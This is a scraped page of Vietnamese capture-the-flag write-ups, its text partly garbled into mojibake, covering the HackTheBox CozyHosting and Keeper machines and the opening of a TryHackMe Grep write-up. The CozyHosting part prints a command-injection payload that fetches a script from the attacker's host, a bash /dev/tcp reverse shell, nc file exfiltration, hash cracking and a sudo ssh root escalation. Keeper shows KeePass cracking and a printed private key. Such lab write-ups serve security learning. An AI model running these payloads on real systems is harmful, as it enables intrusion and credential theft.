http://cozyhosting.htb |_http-server-header: nginx/1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 8000/tcp open http-alt? syn-ack ttl 63 8083/tcp open us-srv? syn-ack ttl 63 12345/tcp open netbus? syn-ack ttl 63 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm host vÃ o /etc/hosts Ä‘á»ƒ truy cáº­p web server\n127.0.0.1 localhost 127.0.1.1 kali 10.10.11.230 cozyhosting.htb ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters DÃ¹ng nuclei Ä‘á»ƒ scan qua web nÃ y\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nuclei -u http://cozyhosting.htb __ _ ____ __ _______/ /__ (_) / __ \\/ / / / ___/ / _ \\/ / / / / / /_/ / /__/ / __/ / /_/ /_/\\__,_/\\___/_/\\___/_/ v2.9.10 projectdiscovery.io [WRN] Found 1 templates with syntax error (use -validate flag for further examination) [INF] Current nuclei version: v2.9.10 (outdated) [INF] Current nuclei-templates version: v9.6.4 (latest) [INF] New templates added in latest release: 121 [INF] Templates loaded for current scan: 6893 [INF] Targets loaded for current scan: 1 [INF] Templates clustered: 1202 (Reduced 1141 Requests) [nginx-version] [http] [info] http://cozyhosting.htb [nginx/1.18.0] [INF] Using Interactsh Server: oast.site [tech-detect:bootstrap] [http] [info] http://cozyhosting.htb [tech-detect:google-font-api] [http] [info] http://cozyhosting.htb [tech-detect:nginx] [http] [info] http://cozyhosting.htb [dns-saas-service-detection] [dns] [info] cozyhosting.htb [springboot-actuator:available-endpoints] [http] [info] http://cozyhosting.htb/actuator [self,sessions,beans,env,env-toMatch,health,health-path,mappings] [options-method] [http] [info] http://cozyhosting.htb [GET,HEAD,OPTIONS] [springboot-env] [http] [low] http://cozyhosting.htb/actuator/env [http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:strict-transport-security] [http] [info] http://cozyhosting.htb [http-missing-security-headers:permissions-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://cozyhosting.htb [http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:content-security-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:referrer-policy] [http] [info] http://cozyhosting.htb [http-missing-security-headers:clear-site-data] [http] [info] http://cozyhosting.htb [springboot-mappings] [http] [low] http://cozyhosting.htb/actuator/mappings [openssh-detect] [tcp] [info] cozyhosting.htb:22 [SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3] [spring-detect] [http] [info] http://cozyhosting.htb/error [waf-detect:nginxgeneric] [http] [info] http://cozyhosting.htb/ [springboot-beans] [http] [low] http://cozyhosting.htb/actuator/beans Äá»ƒ Ã½ cÃ³ dir lÃ  actuator, Ä‘Ã¢y lÃ  Spring Boot.\nSá»­ dá»¥ng dirsearch\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/jexboss] â””â”€# dirsearch -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt _|. _ _ _ _ _ _|_ v0.4.2 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 112 Output File: /root/.dirsearch/reports/cozyhosting.htb/_23-10-07_06-37-28.txt Error Log: /root/.dirsearch/logs/errors-23-10-07_06-37-28.log Target: http://cozyhosting.htb/ [06:37:29] Starting: [06:37:29] 200 - 634B - /actuator [06:37:29] 200 - 5KB - /actuator/env [06:37:29] 200 - 487B - /actuator/env/path [06:37:29] 200 - 487B - /actuator/env/home [06:37:30] 200 - 487B - /actuator/env/lang [06:37:30] 200 - 15B - /actuator/health [06:37:30] 200 - 10KB - /actuator/mappings [06:37:30] 200 - 98B - /actuator/sessions [06:37:30] 200 - 124KB - /actuator/beans Task Completed TÃ´i cÃ³ /actuator/sessions\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/jexboss] â””â”€# curl http://cozyhosting.htb/actuator/sessions {\u0026#34;6D3BD4BCE55E6178BBDFA87EEB570468\u0026#34;:\u0026#34;kanderson\u0026#34;} Enumeration # Sá»­ dá»¥ng burpsuite Ä‘á»ƒ chÃ¨n sessionID\nThá»­ nháº­p input vÃ o 2 trÆ°á»ng vÃ  báº¯t request báº±ng burp\ná» trÆ°á»ng location trong response tráº£ vá» cho tÃ´i káº¿t quáº£ cá»§a káº¿t ná»‘i. Váº­y thÃ¬ tÃ´i cÃ³ thá»ƒ thá»­ command injection Ä‘á»ƒ server tráº£ káº¿t quáº£ vá» cho tÃ´i Ä‘Æ°á»£c khÃ´ng\nThá»­ bypass without space\nThá»­ thÃªm dáº¥u nhÃ¡y ngÆ°á»£c\nVáº­y lÃ  thÃ nh cÃ´ng. TÃ´i sáº½ sá»­ dá»¥ng cÃ¡ch nÃ y Ä‘á»ƒ táº£i RCE lÃªn mÃ¡y.\nRCE # Äáº§u tiÃªn, táº¥t nhiÃªn rá»“i, táº¡o RCE trÆ°á»›c. Táº¡o 1 file vá»›i tÃªn rce.sh vá»›i IP vÃ  port (dÃ¹ng Ä‘á»ƒ táº¡o listener)\nbash -c \u0026quot;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.65/5555 0\u0026gt;\u0026amp;1\u0026quot;\ncd Ä‘áº¿n thÆ° má»¥c chá»©a rce phÃ­a trÃªn vÃ  táº¡o local http server\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# python3 -m http.server 2345 Serving HTTP on 0.0.0.0 port 2345 (http://0.0.0.0:2345/) ... Tiáº¿p theo táº£i RCE lÃªn mÃ¡y (IP VPN cá»§a tÃ´i Ä‘Ã£ thay Ä‘á»•i) theo lá»‡nh\nhost=10.10.14.65\u0026amp;username=`wget${IFS}http://10.10.14.65:2345/rce.sh${IFS}-P${IFS}/tmp` Quay láº¡i http server Ä‘á»ƒ kiá»ƒm tra\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# python3 -m http.server 2345 Serving HTTP on 0.0.0.0 port 2345 (http://0.0.0.0:2345/) ... 10.10.11.230 - - [09/Oct/2023 04:37:38] \u0026#34;GET /rce.sh HTTP/1.1\u0026#34; 200 - Thay Ä‘á»•i permission cá»§a file RCE (burp request)\nhost=10.10.14.65\u0026amp;username=`chmod${IFS}777${IFS}/tmp/rce.sh` Táº¡o listener trÃªn mÃ¡y attack\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 5555 listening on [any] 5555 ... Cháº¡y RCE\nhost=10.10.14.65\u0026amp;username=`bash${IFS}/tmp/rce.sh` Quay láº¡i listener\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 5555 listening on [any] 5555 ... connect to [10.10.14.65] from (UNKNOWN) [10.10.11.230] 43542 bash: cannot set terminal process group (1043): Inappropriate ioctl for device bash: no job control in this shell app@cozyhosting:/app$ id id uid=1001(app) gid=1001(app) groups=1001(app) app@cozyhosting:/app$ LÆ°u Ã½: trong toÃ n bá»™ quÃ¡ trÃ¬nh táº¡o RCE, náº¿u bá»‹ máº¥t káº¿t ná»‘i thÃ¬ reload trang sessions Ä‘á»ƒ láº¥y sessiong má»›i cá»§a kanderson\nSSH # app@cozyhosting:/tmp$ ls /home ls /home josh TÃ´i cÃ³ 1 user tÃªn josh\napp@cozyhosting:/app$ ls -la ls -la total 58856 drwxr-xr-x 2 root root 4096 Aug 14 14:11 . drwxr-xr-x 19 root root 4096 Aug 14 14:11 .. -rw-r--r-- 1 root root 60259688 Aug 11 00:45 cloudhosting-0.0.1.jar Láº¥y file jar nÃ y vá» vÃ  thá»­ phÃ¢n tÃ­ch\napp@cozyhosting:/app$ nc 10.10.14.65 1234 \u0026lt; cloudhosting-0.0.1.jar nc 10.10.14.65 1234 \u0026lt; cloudhosting-0.0.1.jar app@cozyhosting:/app$ â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# nc -lnvp 1234 \u0026gt; cloudhosting-0.0.1.jar listening on [any] 1234 ... connect to [10.10.14.65] from (UNKNOWN) [10.10.11.230] 33940 Sá»­ dá»¥ng jadx Ä‘á»ƒ má»Ÿ file jar nÃ y. TÃ´i tÃ¬m tháº¥y thÃ´ng tin Ä‘Äƒng nháº­p vÃ o database postgresql\nQuay láº¡i RCE Ä‘á»ƒ Ä‘Äƒng nháº­p db\napp@cozyhosting:/tmp$ psql -h localhost -p 5432 -U postgres -d cozyhosting psql -h localhost -p 5432 -U postgres -d cozyhosting Password for user postgres: Vg\u0026amp;nvzAQ7XxR Má»™t lÃºc lá»¥c lá»i thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c credentials\nkanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User admin | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin DÃ¹ng john Ä‘á»ƒ decrypt hash nÃ y\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt --format=bcrypt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 16 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status manchesterunited (admin) 1g 0:00:00:08 DONE (2023-10-09 10:50) 0.1119g/s 322.5p/s 322.5c/s 322.5C/s mygirl..secrets Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Thá»­ login ssh vá»›i user josh vÃ  password vá»«a decrypt Ä‘Æ°á»£c\nâ”Œâ”€â”€(rootã‰¿kali)-[~] â””â”€# ssh josh@10.10.11.230 josh@10.10.11.230\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-82-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon Oct 9 03:01:09 PM UTC 2023 System load: 0.0 Usage of /: 55.4% of 5.42GB Memory usage: 36% Swap usage: 0% Processes: 301 Users logged in: 1 IPv4 address for eth0: 10.10.11.230 IPv6 address for eth0: dead:beef::250:56ff:feb9:9679 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Mon Oct 9 14:32:04 2023 from 10.10.14.106 josh@cozyhosting:~$ id uid=1003(josh) gid=1003(josh) groups=1003(josh) josh@cozyhosting:~$ josh@cozyhosting:~$ ls user.txt Privilege escalation # josh@cozyhosting:~$ sudo -l [sudo] password for josh: Matching Defaults entries for josh on localhost: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User josh may run the following commands on localhost: (root) /usr/bin/ssh * VÃ o ssh | GTFOBins vÃ  láº¥y quyá»n root vá»›i sudo\njosh@cozyhosting:~$ sudo ssh -o ProxyCommand=\u0026#39;;sh 0\u0026lt;\u0026amp;2 1\u0026gt;\u0026amp;2\u0026#39; x # id uid=0(root) gid=0(root) groups=0(root) # ls /root root.txt ","date":"7 October 2023","externalUrl":null,"permalink":"/ctf/hackthebox/cozyhosting/","section":"Ctf","summary":"","title":"HackTheBox - CozyHosting","type":"ctf"},{"content":"","date":"7 October 2023","externalUrl":null,"permalink":"/tags/spring-boot/","section":"Tags","summary":"","title":"Spring Boot","type":"tags"},{"content":" Reconnaissance and Scanning # Port scan, tÃ´i dÃ¹ng RustScan\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3539d439404b1f6186dd7c37bb4b989e (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc= | 256 1ae972be8bb105d5effedd80d8efc066 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: GET HEAD Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Truy cáº­p thá»­ vÃ o web vá»›i port 80\nTÃ´i sáº½ thÃªm hosts Ä‘á»ƒ truy cáº­p domain nÃ y\nTÃ´i cÃ³ má»™t vÃ i thÃ´ng tin vá» page nÃ y: best practical, RT 4.4.4+dfsg-2ubuntu1 (Debian). TÃ¬m kiáº¿m thÃ´ng tin trÃªn gu gá»“ vÃ  tÃ´i cÃ³ tÃ i khoáº£n máº·c Ä‘á»‹nh á»Ÿ Ä‘Ã¢y Thá»­ Ä‘Äƒng nháº­p vá»›i tÃ i khoáº£n máº·c Ä‘á»‹nh root:password\nDáº¡o quanh page nÃ y, tÃ´i tÃ¬m tháº¥y user khÃ¡c á»Ÿ Admin -\u0026gt; Users -\u0026gt; Select\nThá»­ Ä‘Äƒng nháº­p ssh báº±ng user má»›i\nSSH # â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh lnorgaard@10.10.11.227 The authenticity of host \u0026#39;10.10.11.227 (10.10.11.227)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.11.227\u0026#39; (ED25519) to the list of known hosts. lnorgaard@10.10.11.227\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings You have mail. Last login: Sun Oct 15 13:42:38 2023 from 10.10.14.61 lnorgaard@keeper:~$ id uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard) TÃ´i cÃ³ user.txt á»Ÿ Ä‘Ã¢y\nPrivilege escalation # BÃªn cáº¡nh user.txt, tÃ´i cÃ²n 1 file zip ná»¯a RT30000.zip. Unzip nÃ³ vÃ  tÃ´i Ä‘Æ°á»£c 2 file má»›i\nlnorgaard@keeper:~$ unzip /home/lnorgaard/RT30000.zip Archive: /home/lnorgaard/RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx Unzip Ä‘Æ°á»£c 2 file. Vá»›i file passcodes, khi tÃ¬m hiá»ƒu cÃ¡ch má»Ÿ file nÃ y, tÃ´i tÃ¬m Ä‘Æ°á»£c cÃ¡ch crack password tá»« file kdbx vá»›i john\nâ”Œâ”€â”€(rootã‰¿kali)-[~kali/keepass-dump-masterkey] â””â”€# keepass2john passcodes.kdbx \u0026gt; passcodes.txt â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/keepass-dump-masterkey] â””â”€# john -w=/usr/share/wordlists/rockyou.txt.gz passcodes.txt Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 60000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes Will run 6 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Warning: UTF-16 BOM seen in wordlist. File may not be read properly unless you re-encode it 0g 0:00:12:40 DONE (2023-10-15 13:48) 0g/s 180.5p/s 180.5c/s 180.5C/s ï¿½ï¿½ï¿½ï¿½Ê’:ï¿½!=*$ï¿½\\3Tï¿½x#aï¿½Uï¿½L:ï¿½-*ï¿½ï¿½(\u0026gt;8ï¿½^Y..Rï¿½ï¿½4ï¿½^oï¿½ï¿½Rï¿½ï¿½)ï¿½ï¿½ï¿½ï¿½-ï¿½lQï¿½{ï¿½v{ACï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ Session completed. KhÃ´ng cÃ³ káº¿t quáº£.\nTÃ¬m kiáº¿m vá» KeePass vÃ  dump, tÃ´i tÃ¬m Ä‘Æ°á»£c CMEPW/keepass-dump-masterkey. Clone nÃ³ vá» vÃ  táº£i nÃ³ lÃªn mÃ¡y\nâ”Œâ”€â”€(rootã‰¿kali)-[~kali] â””â”€# git clone https://github.com/CMEPW/keepass-dump-masterkey.git Cloning into \u0026#39;keepass-dump-masterkey\u0026#39;... remote: Enumerating objects: 9, done. remote: Counting objects: 100% (9/9), done. remote: Compressing objects: 100% (6/6), done. remote: Total 9 (delta 0), reused 6 (delta 0), pack-reused 0 Receiving objects: 100% (9/9), 32.52 KiB | 756.00 KiB/s, done. â”Œâ”€â”€(rootã‰¿kali)-[~kali] â””â”€# cd keepass-dump-masterkey â”Œâ”€â”€(rootã‰¿kali)-[~kali/keepass-dump-masterkey] â””â”€# python3 -m http.server 4444 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ... lnorgaard@keeper:~/RT30000$ wget http://10.10.14.130:4444/poc.py --2023-10-15 19:20:25-- http://10.10.14.130:4444/poc.py Connecting to 10.10.14.130:4444... connected. HTTP request sent, awaiting response... 200 OK Length: 2735 (2.7K) [text/x-python] Saving to: â€˜poc.pyâ€™ poc.py 100%[====================================================================================================================================================\u0026gt;] 2.67K --.-KB/s in 0.004s 2023-10-15 19:20:25 (620 KB/s) - â€˜poc.pyâ€™ saved [2735/2735] lnorgaard@keeper:~/RT30000$ python3 poc.py -d KeePassDumpFull.dmp 2023-10-15 19:42:03,381 [.] [main] Opened KeePassDumpFull.dmp Possible password: â—,dgrâ—d med flâ—de Possible password: â—ldgrâ—d med flâ—de Possible password: â—`dgrâ—d med flâ—de Possible password: â—-dgrâ—d med flâ—de Possible password: â—\u0026#39;dgrâ—d med flâ—de Possible password: â—]dgrâ—d med flâ—de Possible password: â—Adgrâ—d med flâ—de Possible password: â—Idgrâ—d med flâ—de Possible password: â—:dgrâ—d med flâ—de Possible password: â—=dgrâ—d med flâ—de Possible password: â—_dgrâ—d med flâ—de Possible password: â—cdgrâ—d med flâ—de Possible password: â—Mdgrâ—d med flâ—de TÃ´i khÃ´ng hiá»ƒu láº¯m vá» cÃ¡c password nÃ y, tÃ¬m kiáº¿m vá» cÃ¡c tool keepass trÃªn kali tÃ´i tÃ¬m Ä‘Æ°á»£c keepass2\nâ”Œâ”€â”€(rootã‰¿kali)-[~kali/keepass-dump-masterkey] â””â”€# keepass2 Sau khi add file kdbx, tÃ´i cáº§n pháº£i nháº­p password. Váº­y thÃ¬ tÃ´i sáº½ thá»­ nháº­p tá»«ng password á»Ÿ pháº§n dump Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c phÃ­a trÃªn. Tuy nhiÃªn thÃ¬ khÃ´ng cÃ³ cÃ¡i nÃ o Ä‘Æ°á»£c. TÃ´i thá»­ sao chÃ©p cÃ¡i password Ä‘Ã³ lÃªn Gu gá»“ vÃ  Ä‘Æ°á»£c Gu gá»“ gá»£i Ã½ sang 1 káº¿t quáº£ khÃ¡c\nÄoáº¡n Ä‘áº§u tiÃªn ráº¥t giá»‘ng vá»›i password cá»§a tÃ´i nÃªn tÃ´i sáº½ thá»­ nÃ³\nVáº«n khÃ´ng Ä‘Æ°á»£c. NhÆ°ng tÃ´i thá»­ viáº¿t thÆ°á»ng táº¥t cáº£ thÃ¬ Ä‘Æ°á»£c\nTÃ´i cÃ³ 1 PuTTY key á»Ÿ Ä‘Ã¢y. LÆ°u nÃ³ vá» dÆ°á»›i tÃªn root.ppk vÃ  sá»­ dá»¥ng puttygen Ä‘á»ƒ generate Ä‘Æ°á»£c private key cá»§a root.\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# cat root.ppk PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D 8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et Private-Lines: 14 AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV 09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is= Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0 â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# puttygen root.ppk -O private-openssh -o root.pem Login vÃ o ssh\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh -i root.pem root@10.10.11.227 Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings You have new mail. Last login: Sun Oct 15 14:41:25 2023 from 10.10.14.61 root@keeper:~# id uid=0(root) gid=0(root) groups=0(root) root@keeper:~# ls /root root.txt RT30000.zip SQL root@keeper:~# ","date":"27 August 2023","externalUrl":null,"permalink":"/ctf/hackthebox/keeper/","section":"Ctf","summary":"","title":"HackTheBox - Keeper","type":"ctf"},{"content":"","date":"27 August 2023","externalUrl":null,"permalink":"/tags/keepass/","section":"Tags","summary":"","title":"Keepass","type":"tags"},{"content":"","date":"20 August 2023","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"Php","type":"tags"},{"content":"TryHackMe - Grep\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d6af37230fdfe14d17e3b89eaa6af4ba (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCrtm91fsPghgy6hHw1Y6us1n3WWXbx78a01ZR0xxfkgflDuBbvQeAuqhIoZ5MsB5YpPGCKDFTZ33KZeTCb89SVEidBoatBWJf3+Ys/iTaXJYrEZUNMwiJ8prll8u2MfAEB/3Up5jx4Qbt7BW5criwtzA+/LkvmOb2FKWQzM3l2Mg0QtkvtRbcw0H+MTvz2hRxTYqU//MdyxVh1nnvdPYdhtA7IQ8Lqg8Au0XGjeA58iktw/K3Ljn7wIePzixJclotHLJ5Jxdq6delmHKdOieoHT4MAK5tHA+AZRpZvLYiTWergXvNzHWqdTTssVsDQ8BeCDLs5RvvP36eDngaYZ1pxJ5GxZSlMEc5clmDOa0sb64nJq41MJCNDrpeuJrjcVe3g401mnZFSPUWqNIjLGH3VSWohbbAsi2YCrr+s3VldoNNWxIVrLXnhZg7HKVsQw2IJy8ufXTTLbC0cQHGuwNnbvmkSVS5nk0zdInPS6a4E22dd7hsJdksKEAEnq6LrgwM= | 256 ea9b6eed77b35d2840c55d6dcc8a7e50 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKvPK6dn5A4GKUH0jYCw+leyMjc03SxV7TMFLz84QZSk6ueoqk1P++5Ly9rx8fCICzM5iT5oV6TmU4Rtr5Gw7Lo= | 256 9cd769de85f6a430e5f56f16640614e0 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG83nf9a5u2ZjV1opLrYvrMSvJGQKbR+mVrAp9ZDdlOn 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.4.41 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US | Issuer: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2023-06-14T13:03:09 | Not valid after: 2024-06-13T13:03:09 | MD5: 72958ef07c16221c3b0a40ee913c766c | SHA-1: 38c23ba334b1851af1d4ee0a37bd701a830c7dd8 | -----BEGIN CERTIFICATE----- | MIIDFzCCAf8CFGTWwbbVKaNSN8fhUdtf0QT84zCSMA0GCSqGSIb3DQEBCwUAMEgx | CzAJBgNVBAYTAlVTMRMwEQYDVQQIDApTb21lLVN0YXRlMREwDwYDVQQKDAhTZWFy | Y2hNRTERMA8GA1UEAwwIZ3JlcC50aG0wHhcNMjMwNjE0MTMwMzA5WhcNMjQwNjEz | MTMwMzA5WjBIMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0ZTERMA8G | A1UECgwIU2VhcmNoTUUxETAPBgNVBAMMCGdyZXAudGhtMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEAtiDNwwY9IR2HADMy6CRAwiPH0s8dIOFGPrbYCbLz | fDKIWURlczzOlmgpscN/YHHpt6P5ywUPLGnMK3ukYag7xTUYl+vmledTnD9oebnJ | 6qDweFFwdZ8hysITyvCyGgqcY52JE2nBtVNj6/L16iZ60KKko8opNsTE5IYj/sUt | PsOxeNiV3oqpOUeKtZJbn7Kssd4KBwnRqTSUlXlPXzeRipAiW5SZZXo6K4YeLVht | XlLPtPWsMC0fj16DDDtxLlZmvu3J5o9egp/eRpWmvKWIaKQ57Y0MKB8/gso8FxxX | NiRY9Nru0C3DCUbc/xXywQ9pIGt/Xir++aXhyxCiIGh22QIDAQABMA0GCSqGSIb3 | DQEBCwUAA4IBAQCzhJu52dIY7V/qQleDMEQ1oBLrQoFhHD6+UbvH0ELMAtL5Dc8A | LGDdyFkgsx04TaZtJ20dyrjYD+tcAgu9Yb7eEYbfqqD5w4XSzvdEuTW2aVL86aT6 | IBbN8SMkX2zfILjHTOR1F7WAoHaIssH0yZltg+lQEEnAeb+XoIZm9cIW2bTNKoO2 | MeHgvSKkQkjROO29XQQ3mTbxFG86UsTwyGHdddnkfiWilXqgfh+wGxbY/wCdhU0C | TnuXn4IEVdCBn16rCg51kEZZC1EWPcJpv0/InUNfcgumcVY033EXF/HgW4eNDD6H | XmLEGKfScUWcO0//STDZGZXwf9gt30DqoMSf |_-----END CERTIFICATE----- |_http-server-header: Apache/2.4.41 (Ubuntu) | tls-alpn: |_ http/1.1 |_http-title: 403 Forbidden 51337/tcp open http syn-ack ttl 63 Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST |_http-title: 400 Bad Request Service Info: Host: ip-10-10-133-64.eu-west-1.compute.internal; 